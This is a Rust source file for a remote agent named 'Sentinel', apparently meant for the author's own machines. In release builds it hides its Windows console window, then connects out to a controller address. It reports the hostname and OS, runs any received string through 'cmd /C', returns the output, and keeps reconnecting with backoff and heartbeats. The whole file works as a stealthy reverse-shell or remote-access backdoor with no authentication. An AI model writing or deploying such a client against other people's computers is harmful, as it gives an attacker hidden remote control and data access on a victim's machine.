// Hide the console window on Windows (release builds won't flash a terminal).
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use common::{recv_packet, send_packet, SentinelPacket};
use std::process::Command;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::task;
use tokio::time::sleep;

// ── Configuration ────────────────────────────────────────────────────────────
// Use a hostname so it works even if your home IP changes (e.g. a free DDNS
// address like  myhouse.ddns.net:8080  or just a plain IP).
const CONTROLLER_ADDR: &str = "127.0.0.1:8080"; // ← change before deploying

// Reconnect backoff: starts at MIN, doubles each failure, caps at MAX (seconds).
const BACKOFF_MIN_SECS: u64 = 5;
const BACKOFF_MAX_SECS: u64 = 120;

// How often to send a keepalive ping when idle (seconds).
const KEEPALIVE_INTERVAL_SECS: u64 = 30;

#[tokio::main]
async fn main() {
    let mut delay = BACKOFF_MIN_SECS;
    loop {
        match connect_with_keepalive(CONTROLLER_ADDR).await {
            Ok(mut stream) => {
                // Reset backoff on a successful connection.
                delay = BACKOFF_MIN_SECS;
                if let Err(e) = run_session(&mut stream).await {
                    eprintln!("Session ended: {e}");
                }
            }
            Err(e) => {
                eprintln!("Connect failed: {e}. Retrying in {delay}s...");
            }
        }
        sleep(Duration::from_secs(delay)).await;
        // Exponential backoff, capped at BACKOFF_MAX_SECS.
        delay = (delay * 2).min(BACKOFF_MAX_SECS);
    }
}

/// Opens a TCP connection and enables OS-level TCP keepalive so the kernel
/// probes the peer after KEEPALIVE_INTERVAL_SECS of silence.  This means
/// a silently-dropped connection (NAT timeout, router reboot, sleep/wake)
/// is detected within ~minutes instead of never.
async fn connect_with_keepalive(addr: &str) -> std::io::Result<TcpStream> {
    let stream = TcpStream::connect(addr).await?;
    let sock_ref = socket2::SockRef::from(&stream);
    let keepalive = socket2::TcpKeepalive::new()
        .with_time(Duration::from_secs(KEEPALIVE_INTERVAL_SECS))
        .with_interval(Duration::from_secs(10))
        .with_retries(3);
    sock_ref.set_tcp_keepalive(&keepalive)?;
    Ok(stream)
}

async fn run_session(stream: &mut TcpStream) -> std::io::Result<()> {
    // Send handshake
    let handshake = SentinelPacket::Handshake {
        hostname: whoami::fallible::hostname().unwrap_or_else(|_| "unknown".to_string()),
        os: format!("{} {}", whoami::platform(), whoami::distro()),
        version: env!("CARGO_PKG_VERSION").to_string(),
    };
    send_packet(stream, &handshake).await?;

    let mut keepalive_tick = tokio::time::interval(Duration::from_secs(KEEPALIVE_INTERVAL_SECS));
    keepalive_tick.tick().await; // discard the immediate first tick

    loop {
        tokio::select! {
            packet = recv_packet(stream) => {
                match packet? {
                    SentinelPacket::Command(cmd_str) => {
                        let reply = execute_command(cmd_str).await;
                        send_packet(stream, &reply).await?;
                    }
                    SentinelPacket::Heartbeat => {
                        send_packet(stream, &SentinelPacket::Heartbeat).await?;
                    }
                    SentinelPacket::Disconnect => {
                        break;
                    }
                    _ => {}
                }
            }
            _ = keepalive_tick.tick() => {
                // Send a heartbeat so the connection doesn't go silent long
                // enough for NAT tables or firewalls to drop it.
                send_packet(stream, &SentinelPacket::Heartbeat).await?;
            }
        }
    }
    Ok(())
}

async fn execute_command(cmd_str: String) -> SentinelPacket {
    let result = task::spawn_blocking(move || {
        Command::new("cmd")
            .args(["/C", &cmd_str])
            .output()
    })
    .await;

    match result {
        Ok(Ok(out)) => {
            let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&out.stderr).into_owned();
            if out.status.success() {
                SentinelPacket::Success(if stdout.is_empty() {
                    "(no output)".to_string()
                } else {
                    stdout
                })
            } else {
                SentinelPacket::Error(if stderr.is_empty() { stdout } else { stderr })
            }
        }
        _ => SentinelPacket::Error("Failed to execute command".to_string()),
    }
}
